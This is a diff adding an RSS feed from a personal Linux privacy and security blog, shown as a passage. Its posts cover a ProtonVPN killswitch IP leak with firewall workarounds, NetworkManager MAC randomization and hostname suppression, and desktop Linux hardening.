@@ -1,0 +1,904 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Linux on A loudrxiv - A website for the academically-stunted</title>
+    <link>https://loudrxiv.github.io/tags/linux/</link>
+    <description>Recent content in Linux on A loudrxiv - A website for the academically-stunted</description>
+    <image>
+      <url>https://loudrxiv.github.io/waving_snail.png</url>
+      <link>https://loudrxiv.github.io/waving_snail.png</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>[CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/)</copyright>
+    <lastBuildDate>Sat, 08 Oct 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://loudrxiv.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>ProtonVPN IP Leakage on Linux and Workaround</title>
+      <link>https://loudrxiv.github.io/posts/linux/protonvpn-ip-leakage-on-linux-and-workaround/</link>
+      <pubDate>Sat, 08 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://loudrxiv.github.io/posts/linux/protonvpn-ip-leakage-on-linux-and-workaround/</guid>
+      <description>Before We Start&amp;hellip;
+I sent Proton an email regarding this issue in late August 2022 and was told they are working on fixing it, though it will take some time as it requires some architectural changes in how the killswitch works.
+The Leak Ideally, when implementing a killswitch, a VPN client should drop all connections on non-VPN interfaces except when the connection is to the VPN provider&amp;rsquo;s servers. This is necessary to prevent accidental leaks, at least by unprivileged applications.</description>
+      <content:encoded><![CDATA[<p><strong>Before We Start</strong>&hellip;</p>
+<p>I sent Proton an email regarding this issue in late August 2022 and was told they are working on fixing it, though it will take some time as it requires some architectural changes in how the killswitch works.</p>
+<h2 id="the-leak">The Leak</h2>
+<p>Ideally, when implementing a killswitch, a VPN client should drop all connections on non-VPN interfaces except when the connection is to the VPN provider&rsquo;s servers. This is necessary to prevent accidental leaks, at least by unprivileged applications. Unfortunately, the ProtonVPN client does not currently do this.</p>
+<p>Effectively, any application that binds to the connected physical interface (as opposed to the VPN&rsquo;s virtual interface) on your Linux system will expose your actual IP address, regardless of the killswitch state. This is problematic, especially for certain applications like Torrent clients, as they tend to use whatever interfaces they can access (rather than just the default one) to connect to the internet.
+You can check this with <code>curl</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --interface &lt;physical interface&gt; https://ipinfo.io
+</span></span></code></pre></div><p>This will return your actual IP address.</p>
+<h2 id="the-workaround">The Workaround</h2>
+<h3 id="qubes-os">Qubes OS</h3>
+<p>On Qubes OS, you generally should not have a problem if you use the ProtonVPN client in a ProxyVM. While the same issue still exists within the ProxyVM itself, it is unlikely to manifest as you should not be running any other applications in the same Qube anyways, and apps in an AppVM cannot bind to the public interface of the ProxyVM. I have not observed any leaks from an AppVM behind a ProtonVPN ProxyVM.</p>
+<h3 id="general-linux-distributions">General Linux Distributions</h3>
+<p>On a general Linux distribution, the workaround is to configure OpenVPN manually and setup a killswitch yourself.</p>
+<p>Since ProtonVPN does not support IPv6, you should disable it in your kernel settings:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;net.ipv6.conf.all.disable_ipv6=1
+</span></span></span><span class="line"><span class="cl"><span class="s1">net.ipv6.conf.default.disable_ipv6=1
+</span></span></span><span class="line"><span class="cl"><span class="s1">net.ipv6.conf.lo.disable_ipv6=1&#39;</span> <span class="p">|</span> sudo tee /etc/sysctl.d/10-disable-ipv6.conf
+</span></span><span class="line"><span class="cl">sudo sysctl -p
+</span></span></code></pre></div><p>Next, download your OpenVPN configuration files from <a href="https://account.protonvpn.com/">account.protonvpn.com</a>. In those configuration files, you should see a list of IP addresses and ports of ProtonVPN&rsquo;s servers.</p>
+<p>Finally, set up the VPN killswitch. The rules I posted here are based on <a href="https://airvpn.org/forums/topic/15061-firewalld-killswitch/">this discussion</a>.</p>
+<h4 id="firewalld">Firewalld</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter FORWARD <span class="m">0</span> -o tun+ -j ACCEPT
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter FORWARD <span class="m">0</span> -i tun+ -j ACCEPT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv6 filter INPUT <span class="m">0</span> -j DROP
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT <span class="m">0</span> -i lo -j ACCEPT
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT <span class="m">1</span> -i tun+ -p tcp -j ACCEPT
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT <span class="m">1</span> -i tun+ -p udp -j ACCEPT
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter INPUT <span class="m">999</span> -j DROP
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv6 filter OUTPUT <span class="m">0</span> -j DROP
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter OUTPUT <span class="m">0</span> -o lo -j ACCEPT
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter OUTPUT <span class="m">0</span> -o tun+ -j ACCEPT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#You will need to add each of the IP address and port with the following command:</span>
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter OUTPUT <span class="m">1</span> -p udp -m udp --dport <span class="nv">$PORT</span> -d <span class="nv">$IP</span> -j ACCEPT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --direct --permanent --add-rule ipv4 filter OUTPUT <span class="m">999</span> -j DROP
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo firewall-cmd --reload
+</span></span></code></pre></div><h4 id="ufw">UFW</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo ufw default deny incoming
+</span></span><span class="line"><span class="cl">sudo ufw default deny outgoing
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#You will need to add each of the IP address and port with the following command:</span>
+</span></span><span class="line"><span class="cl">sudo ufw allow out to <span class="nv">$IP</span> port <span class="nv">$PORT</span> proto udp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo ufw allow out on tun0 from any to any
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>NetworkManager Trackability Reduction</title>
+      <link>https://loudrxiv.github.io/posts/linux/networkmanager-trackability-reduction/</link>
+      <pubDate>Sun, 04 Sep 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://loudrxiv.github.io/posts/linux/networkmanager-trackability-reduction/</guid>
+      <description>MAC address randomization Note that Ethernet connections can still be tracked via switch ports, and WiFi connections can be broadly localized by access point.
+Furthermore, MAC address spoofing and randomization depends on firmware support from the interface. Most modern network interface cards support the feature.
+There are three different aspects of MAC address randomization in NetworkManager, each with their own configuration flag:
+WiFi scanning [device] wifi.scan-rand-mac-address=yes WiFi connections [connection] wifi.cloned-mac-address=&amp;lt;mode&amp;gt; Ethernet connections [connection] ethernet.</description>
+      <content:encoded><![CDATA[<h2 id="mac-address-randomization">MAC address randomization</h2>
+<p>Note that Ethernet connections can still be tracked via switch ports, and WiFi connections can be broadly localized by access point.</p>
+<p>Furthermore, MAC address spoofing and randomization depends on firmware support from the interface. Most modern network interface cards support the feature.</p>
+<p>There are three different aspects of MAC address randomization in NetworkManager, each with their own configuration flag:</p>
+<h4 id="wifi-scanning">WiFi scanning</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[device]
+</span></span><span class="line"><span class="cl">wifi.scan-rand-mac-address=yes
+</span></span></code></pre></div><h4 id="wifi-connections">WiFi connections</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[connection]
+</span></span><span class="line"><span class="cl">wifi.cloned-mac-address=&lt;mode&gt;
+</span></span></code></pre></div><h4 id="ethernet-connections">Ethernet connections</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[connection]
+</span></span><span class="line"><span class="cl">ethernet.cloned-mac-address=&lt;mode&gt;
+</span></span></code></pre></div><h4 id="mode-options">Mode options</h4>
+<p><code>random</code>: Generate a new random MAC address every time a connection is activated</p>
+<p><code>stable</code>: Assign each connection a random MAC address that will be maintained across activations</p>
+<p><code>preserve</code>: Use the MAC address already assigned to the interface (such as from <code>macchanger</code>), or the permanent address if none is assigned</p>
+<p><code>permanent</code>: Use the MAC address permanently baked into the hardware</p>
+<h3 id="macrand-default-configuration">Setting a default configuration</h3>
+<p>It&rsquo;s best to create a dedicated configuration file, such as <code>/etc/NetworkManager/conf.d/99-random-mac.conf</code>, to ensure package updates do not overwrite the configuration. In general, I recommend the following:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[device]
+</span></span><span class="line"><span class="cl">wifi.scan-rand-mac-address=yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[connection]
+</span></span><span class="line"><span class="cl">wifi.cloned-mac-address=random
+</span></span><span class="line"><span class="cl">ethernet.cloned-mac-address=random
+</span></span></code></pre></div><p>This configuration randomizes all MAC addresses by default. These settings can of course be <a href="#per-connection-overrides">overridden on a per-connection basis</a>.</p>
+<p>After editing the file, run <code>sudo nmcli general reload conf</code> to apply the new configuration.</p>
+<h3 id="per-connection-overrides">Per-connection overrides</h3>
+<p>Connection-specific settings take precedence over configuration file defaults. They can be set through <code>nm-connection-editor</code> (&ldquo;Network Connections&rdquo;), a DE-specific network settings GUI, <code>nmtui</code>, or <code>nmcli</code>.</p>
+<p>Look for &ldquo;Cloned MAC address&rdquo; under the &ldquo;Wi-Fi&rdquo; or &ldquo;Ethernet&rdquo; section:</p>
+<p><img loading="lazy" src="/images/nm-connection-editor.webp" alt="nm-connection-editor screenshot"  />
+</p>
+<p>In addition to the four mode keywords, you can input an exact MAC address to be used for that connection.</p>
+<p>For a home or other trusted network, it can be helpful to use <code>stable</code> or even <code>permanent</code>, as MAC address stability can help avoid being repeatedly served a new IP address and DHCP lease (though not all DHCP servers work this way).</p>
+<p>For public networks with captive portals (webpages that must be accessed to gain network access), the <code>stable</code> setting can help prevent redirection back to the captive portal after a brief disconnection or roaming to a different access point.</p>
+<h3 id="seeing-the-randomized-mac-address">Seeing the randomized MAC address</h3>
+<p>Activate the connection in question, and then look for <code>GENERAL.HWADDR</code> in the output of <code>nmcli device show</code>. This represents the MAC address currently in use by the interface, whether randomized or not. It is also visible as &ldquo;Hardware Address&rdquo; (or similar) in NetworkManager GUIs under active connection details.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmcli device show
+</span></span><span class="line"><span class="cl">GENERAL.DEVICE:                         enp5s0
+</span></span><span class="line"><span class="cl">GENERAL.TYPE:                           ethernet
+</span></span><span class="line"><span class="cl">GENERAL.HWADDR:                         XX:XX:XX:XX:XX:XX
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">GENERAL.DEVICE:                         wlp3s0
+</span></span><span class="line"><span class="cl">GENERAL.TYPE:                           wifi
+</span></span><span class="line"><span class="cl">GENERAL.HWADDR:                         XX:XX:XX:XX:XX:XX
+</span></span></code></pre></div><hr>
+<h2 id="remove-static-hostname-to-prevent-hostname-broadcast">Remove static hostname to prevent hostname broadcast</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo hostnamectl hostname <span class="s2">&#34;localhost&#34;</span>
+</span></span></code></pre></div><p>An empty (blank) hostname is also an option, but a static hostname of &ldquo;localhost&rdquo; is less likely to cause breakage. Both will result in no hostname being broadcasted to the DHCP server.</p>
+<h3 id="rmhostname-transient">Disabling transient hostname management</h3>
+<p>It&rsquo;s best to create a dedicated configuration file, such as <code>/etc/NetworkManager/conf.d/01-transient-hostname.conf</code>, to ensure package updates do not overwrite the configuration:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[main]
+</span></span><span class="line"><span class="cl">hostname-mode=none
+</span></span></code></pre></div><p>This will prevent NetworkManager from setting transient hostnames that may be provided by some DHCP servers. This will have no visible effect except with an empty static hostname.</p>
+<p>After editing the file, run <code>sudo nmcli general reload conf</code> to apply the new configuration. Run <code>sudo hostnamectl --transient hostname &quot;&quot;</code> to reset the transient hostname.</p>
+<hr>
+<h2 id="disable-sending-hostname-to-dhcp-server">Disable sending hostname to DHCP server</h2>
+<p><strong>This configuration will leak your hostname on first connection.</strong> Setting a generic or random hostname is strongly recommended if possible.</p>
+<p>Due to <a href="https://gitlab.freedesktop.org/NetworkManager/NetworkManager/-/issues/584" title="NetworkManager issue: No way to set dhcp-send-hostname globally">limitations in NetworkManager</a>, it is not possible to reliably disable sending hostnames by default. This setup is very much a hack.</p>
+<p>Due to being leaky, this configuration is virtually useless without also <a href="#macrand-default-configuration" title="MAC address randomization — Setting a default configuration">randomizing MAC addresses by default</a>. Your MAC address and hostname will not be correlated starting with the second connection, assuming the first connection used a random MAC address.</p>
+<p>Create <code>/etc/NetworkManager/dispatcher.d/no-wait.d/01-no-send-hostname.sh</code> as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="k">$(</span>nmcli -g 802-11-wireless.cloned-mac-address c show <span class="s2">&#34;</span><span class="nv">$CONNECTION_UUID</span><span class="s2">&#34;</span><span class="k">)</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s1">&#39;permanent&#39;</span> <span class="o">]</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="o">||</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="k">$(</span>nmcli -g 802-3-ethernet.cloned-mac-address c show <span class="s2">&#34;</span><span class="nv">$CONNECTION_UUID</span><span class="s2">&#34;</span><span class="k">)</span><span class="s2">&#34;</span> <span class="o">=</span> <span class="s1">&#39;permanent&#39;</span> <span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="k">then</span>
+</span></span><span class="line"><span class="cl">    nmcli connection modify <span class="s2">&#34;</span><span class="nv">$CONNECTION_UUID</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>            ipv4.dhcp-send-hostname <span class="nb">true</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>            ipv6.dhcp-send-hostname <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">    nmcli connection modify <span class="s2">&#34;</span><span class="nv">$CONNECTION_UUID</span><span class="s2">&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>            ipv4.dhcp-send-hostname <span class="nb">false</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>            ipv6.dhcp-send-hostname <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"><span class="k">fi</span>
+</span></span></code></pre></div><p>The script must have specific file permissions and a symlink to take effect:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /etc/NetworkManager/dispatcher.d/
+</span></span><span class="line"><span class="cl">sudo chown root:root no-wait.d/01-no-send-hostname.sh
+</span></span><span class="line"><span class="cl">sudo chmod <span class="m">744</span> no-wait.d/01-no-send-hostname.sh
+</span></span><span class="line"><span class="cl">sudo ln -s no-wait.d/01-no-send-hostname.sh ./
+</span></span></code></pre></div><p>This script will be automatically triggered on connection events to modify the connection&rsquo;s <code>dhcp-send-hostname</code> settings. If the connection&rsquo;s <em>cloned MAC address</em> is <a href="#per-connection-overrides">explicitly overridden</a> to <code>permanent</code>, the hostname will be sent to the DHCP server on future connections. In all other cases, the hostname will be masked on future connections, so the DHCP server will only see the MAC address.</p>
+<h3 id="verifying-proper-operation">Verifying proper operation</h3>
+<p>After initiating first connection with a network:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmcli c show &lt;connection&gt; <span class="p">|</span> grep dhcp-send-hostname
+</span></span><span class="line"><span class="cl">ipv4.dhcp-send-hostname:                no
+</span></span><span class="line"><span class="cl">ipv6.dhcp-send-hostname:                no
+</span></span></code></pre></div><p><code>&lt;connection&gt;</code> can be the connection name (usually the SSID for WiFi networks) or UUID, obtained from <code>nmcli c show [--active]</code>.</p>
+<p><em>Recall that these setting values are set based on the previous connection activation and take effect for the next connection activation.</em></p>
+<hr>
+<h2 id="sources">Sources</h2>
+<ul>
+<li><a href="https://wiki.archlinux.org/title/NetworkManager#Configuring_MAC_address_randomization">ArchWiki &mdash; NetworkManager</a></li>
+<li><a href="https://www.freedesktop.org/software/systemd/man/hostnamectl">hostnamectl man page</a></li>
+<li><a href="https://blogs.gnome.org/thaller/2016/08/26/mac-address-spoofing-in-networkmanager-1-4-0/">MAC Address Spoofing in NetworkManager 1.4.0</a></li>
+<li><a href="https://networkmanager.dev/docs/api/latest/NetworkManager.conf.html">NetworkManager.conf man page</a></li>
+<li><a href="https://networkmanager.dev/docs/api/latest/NetworkManager-dispatcher.html">NetworkManager-dispatcher man page</a></li>
+<li><a href="https://viliampucik.blogspot.com/2016/09/networkmanager-disable-sending-hostname.html">NetworkManager: Disable Sending Hostname to DHCP Server</a></li>
+<li><a href="https://networkmanager.dev/docs/api/latest/nmcli.html">nmcli man page</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Desktop Linux Hardening</title>
+      <link>https://loudrxiv.github.io/posts/linux/desktop-linux-hardening/</link>
+      <pubDate>Wed, 17 Aug 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://loudrxiv.github.io/posts/linux/desktop-linux-hardening/</guid>
+      <description>Linux is not a secure desktop operating system. However, there are steps you can take to harden it, reduce its attack surface, and improve its privacy.
+Before we start&amp;hellip;
+Some of the sections will include mentions of unofficial builds of packages like linux‑hardened, lkrg‑akmod, hardened_malloc, and so on. These are not endorsements &amp;mdash; they are merely to show that you have options to easily obtain and update these packages. Using unofficial builds of packages means adding more parties to trust, and you have to evaluate whether it is worth doing so for the potential privacy/security benefits or not.</description>
+      <content:encoded><![CDATA[<p>Linux is <a href="/posts/linux/linux-insecurities/">not a secure desktop operating system</a>. However, there are steps you can take to harden it, reduce its attack surface, and improve its privacy.</p>
+<p><strong>Before we start&hellip;</strong></p>
+<p>Some of the sections will include mentions of unofficial builds of packages like linux‑hardened, lkrg‑akmod, hardened_malloc, and so on. These are not endorsements &mdash; they are merely to show that you have options to easily obtain and update these packages. Using unofficial builds of packages means adding more parties to trust, and you have to evaluate whether it is worth doing so for the potential privacy/security benefits or not.</p>
+<p><img loading="lazy" src="/images/fedora-tux.png" alt="Fedora Tux"  />
+</p>
+<h2 id="during-installation">During Installation</h2>
+<h3 id="drive-encryption">Drive Encryption</h3>
+<p>Most Linux distributions have an option within its installer for enabling LUKS full disk encryption. If this option isn&rsquo;t set at installation time, you will have to backup your data and re-install, as encryption is applied after <a href="https://en.wikipedia.org/wiki/Disk_partitioning">disk partitioning</a> but before <a href="https://en.wikipedia.org/wiki/File_system">filesystem</a> creation.</p>
+<h3 id="encrypted-swap">Encrypted Swap</h3>
+<p>Consider using <a href="https://wiki.archlinux.org/title/Dm-crypt/Swap_encryption">encrypted swap</a> or <a href="https://wiki.archlinux.org/title/Swap#zram-generator">ZRAM</a> instead of unencrypted swap to avoid potential security issues with sensitive data being pushed to <a href="https://en.wikipedia.org/wiki/Memory_paging">swap space</a>. While ZRAM can be set up post-installation, if you want to use encrypted swap, you should set it up while partitioning your drive.</p>
+<p>Depending on your distribution, encrypted swap may be automatically set up if you choose to encrypt your drive. Fedora <a href="https://fedoraproject.org/wiki/Changes/SwapOnZRAM">uses ZRAM by default</a>, regardless of whether you enable drive encryption or not.</p>
+<h2 id="privacy-tweaks">Privacy Tweaks</h2>
+<h3 id="networkmanager-trackability-reduction">NetworkManager Trackability Reduction</h3>
+<p>Most desktop Linux distributions including Fedora, openSUSE, Ubuntu, and so on come with <a href="https://en.wikipedia.org/wiki/NetworkManager">NetworkManager</a> by default to configure Ethernet and Wi-Fi settings.</p>
+<p>WfKe9vLwSvv7rN has detailed guide on <a href="/posts/linux/networkmanager-trackability-reduction/">trackability reduction with NetworkManager</a> which I highly recommend you check out.</p>
+<p>In short, if you use NetworkManager, add the following to your <code>/etc/NetworkManager/conf.d/00-macrandomize.conf</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[device]
+</span></span><span class="line"><span class="cl">wifi.scan-rand-mac-address=yes
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[connection]
+</span></span><span class="line"><span class="cl">wifi.cloned-mac-address=random
+</span></span><span class="line"><span class="cl">ethernet.cloned-mac-address=random
+</span></span></code></pre></div><p>Next, disable transient hostname management by adding the following to your <code>/etc/NetworkManager/conf.d/01-transient-hostname.conf</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[main]
+</span></span><span class="line"><span class="cl">hostname-mode=none
+</span></span></code></pre></div><p>Then, restart your NetworkManager service:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo systemctl restart NetworkManager
+</span></span></code></pre></div><p>Finally, set your hostname to <code>localhost</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo hostnamectl hostname <span class="s2">&#34;localhost&#34;</span>
+</span></span></code></pre></div><p>Note that randomizing Wi-Fi MAC addresses depends on support from the Wi-Fi card firmware.</p>
+<h3 id="other-identifiers">Other Identifiers</h3>
+<p>There are other system identifiers which you may wish to be careful about. You should give this some thought to see if it applies to your <a href="/posts/knowledge/threat-modeling/">threat model</a>:</p>
+<dl>
+<dt>Username</dt>
+<dd>Your username is used in a variety of ways across your system. Consider using generic terms like &ldquo;user&rdquo; rather than your actual name.</dd>
+<dt>Machine ID</dt>
+<dd>During installation a unique machine ID is generated and stored on your device. Consider <a href="https://madaidans-insecurities.github.io/guides/linux-hardening.html#machine-id">setting it to a generic ID</a>.</dd>
+</dl>
+<h4 id="system-counting">System Counting</h4>
+<p>Many Linux distributions sends some telemetry data by default to count how many systems are using their software. Consider disabling this depending on your threat model.</p>
+<p>The Fedora Project offers a <a href="https://dnf.readthedocs.io/en/latest/conf_ref.html#countme-label">&ldquo;countme&rdquo; variable</a> to much more accurately <a href="https://fedoraproject.org/wiki/Changes/DNF_Better_Counting">count unique systems accessing its mirrors</a> without involving unique IDs. While currently disabled by default, you could add <code>countme=false</code> to <code>/etc/dnf/dnf.conf</code> in case the default changes in the future. On rpm‑ostree systems such as Fedora Silverblue and Kinoite, the <code>countme</code> option can be disabled by <a href="https://coreos.github.io/rpm-ostree/countme/">masking the rpm-ostree-countme timer</a>.</p>
+<p><a href="https://en.opensuse.org/openSUSE:Statistics">openSUSE uses a unique ID to count systems</a>, which can be disabled by deleting the <code>/var/lib/zypp/AnonymousUniqueId</code> file.</p>
+<p><a href="https://zorin.com/legal/privacy/#census">Zorin OS also uses a unique ID to count systems.</a> You can opt‑out by running <code>sudo apt purge zorin-os-census</code> and optionally holding the package with <code>sudo apt-mark hold zorin-os-census</code> to avoid accidental reinstallation.</p>
+<p><a href="https://snapcraft.io/docs/snap-store-metrics">snapd (Snap) assigns a unique ID to your installation and uses it for telemetry.</a> While this is generally not a problem, if your threat model calls for anonymity, you should avoid using Snap packages and uninstall snapd. Accidental reinstallation on Ubuntu can be prevented with <code>sudo apt-mark hold snapd</code>.</p>
+<p><em>Of course, this is a non‑exhaustive list of telemetry on different Linux distributions. If you are aware of other tracking mechanisms used by these or other distributions, feel free to make a <a href="https://github.com/PrivSec-dev/privsec.dev/blob/main/content/posts/linux/Linux-Desktop-Hardening.md">pull request</a> or <a href="https://github.com/PrivSec-dev/privsec.dev/discussions">discussion post</a> detailing them!</em></p>
+<h3 id="keystroke-anonymization">Keystroke Anonymization</h3>
+<p>You could be <a href="https://www.whonix.org/wiki/Keystroke_Deanonymization">fingerprinted based on soft biometric traits</a> when you use the keyboard. The <a href="https://github.com/vmonaco/kloak">Kloak</a> package could help you mitigate this threat. It is available as a .deb package from <a href="https://www.kicksecure.com/wiki/Packages_for_Debian_Hosts">Kicksecure&rsquo;s repository</a> and an <a href="https://aur.archlinux.org/packages/kloak-git">AUR package</a>.</p>
+<p>With that being said, if your threat model calls for using something like Kloak, you are probably better off just using Whonix.</p>
+<h2 id="application-confinement">Application Confinement</h2>
+<p>Some sandboxing solutions for desktop Linux distributions do exist; however, they are not as strict as those found in macOS or ChromeOS. Software installed with distro package managers (DNF, APT, etc.) typically have <strong>no</strong> sandboxing or confinement whatsoever. Several projects which aim to tackle this problem are discussed here.</p>
+<h3 id="flatpak">Flatpak</h3>
+<div class="youtube-embed-div">
+    <iframe src="https://www.youtube-nocookie.com/embed/GkgPIJp8_30" class="youtube-embed-frame" allowfullscreen title="YouTube Video"></iframe>
+</div>  
+<p><a href="https://flatpak.org">Flatpak</a> aims to be a distribution-agnostic package manager for Linux. One of its main goals is to provide a universal package format which can be used in most Linux distributions. It provides some <a href="https://docs.flatpak.org/en/latest/sandbox-permissions.html">permission control</a>. With that being said, <a href="https://madaidans-insecurities.github.io/linux.html#flatpak">Flatpak sandboxing is quite weak</a>.</p>
+<p>You can restrict applications further by setting <a href="https://docs.flatpak.org/en/latest/flatpak-command-reference.html#flatpak-override">Flatpak overrides</a>. This can be done with the command line or by using <a href="https://github.com/tchx84/Flatseal">Flatseal</a>. Some sample overrides are provided by <a href="https://github.com/tommytran732/Flatpak-Overrides">me</a> and <a href="https://github.com/rusty-snake/kyst/tree/main/flatpak">rusty-snake</a>. Note that this only helps with lax high‑level default permissions and cannot solve the low‑level issues like <code>/proc</code> and <code>/sys</code> access or an insufficient seccomp blacklist.</p>
+<p>Some sensitive permissions of note:</p>
+<ul>
+<li><code>--share=network</code>: network and internet access</li>
+<li><code>--socket=pulseaudio</code>: the PulseAudio socket, grants access to all audio devices (including inputs)</li>
+<li><code>--device=all</code>: access to all devices (including webcams)</li>
+<li><code>--talk-name=org.freedesktop.secrets</code>: D‑Bus access to secrets stored on your keychain</li>
+</ul>
+<p>If an application works natively with Wayland (<em>not</em> running through the <a href="https://wayland.freedesktop.org/xserver.html">XWayland</a> compatibility layer), consider revoking its access to X11 (<code>--nosocket=x11</code>) and the <a href="https://en.wikipedia.org/wiki/Unix_domain_socket">inter‑process communications (IPC)</a> socket (<code>--unshare=ipc</code>) as well.</p>
+<p>Many Flatpak apps ship with broad filesystem permissions such as <code>--filesystem=home</code> and <code>--filesystem=host</code>. Some applications implement the <a href="https://docs.flatpak.org/en/latest/portal-api-reference.html">Portal API</a>, which allows a file manager to pass files to the Flatpak application (e.g. VLC) without specific filesystem access privileges. Despite this, many of them <a href="https://github.com/flathub/org.videolan.VLC/blob/master/org.videolan.VLC.json">still declare <code>--filesystem=host</code></a>.</p>
+<p>My strategy to deal with this is to revoke all filesystem access first, then test if an application works without it. If it does, it means the app is already using portals and no further action is needed. If it doesn&rsquo;t, then I start granting permission to specific directories.</p>
+<p>As odd as this may sound, <strong>you should not enable (blind) unattended updates of Flatpak packages</strong>. If you or a Flatpak frontend (app store) simply executes <code>flatpak update -y</code>, Flatpaks will be automatically granted any new permissions declared upstream without notifying you. Using automatic update with GNOME Software is fine, as it does not automatically update Flatpaks with permission changes and notifies the user instead.</p>
+<h3 id="snap">Snap</h3>
+<p>Snap is another distribution-agnostic package manager with some sandboxing support. It is developed by Canonical and heavily promoted in Ubuntu.</p>
+<p>Snap packages come in <a href="https://snapcraft.io/docs/snap-confinement">two variants</a>: classic, with no confinement, and strictly confined, where AppArmor and cgroups v1 are used to facilitate sandboxing. If a snap uses classic confinement (&ldquo;classic snap&rdquo;), you are better off installing an equivalent package from your distribution&rsquo;s repository if possible. If your system does not have AppArmor, then you should avoid Snap entirely. Additionally, most modern systems outside of Ubuntu and its derivatives use cgroups v2 by default, so you have to set <code>systemd.unified_cgroup_hierarchy=0</code> in your kernel parameters to get cgroups v1 working.</p>
+<p>Snap permissions can be managed via the Snap Store or Ubuntu&rsquo;s custom patched GNOME Control Center.</p>
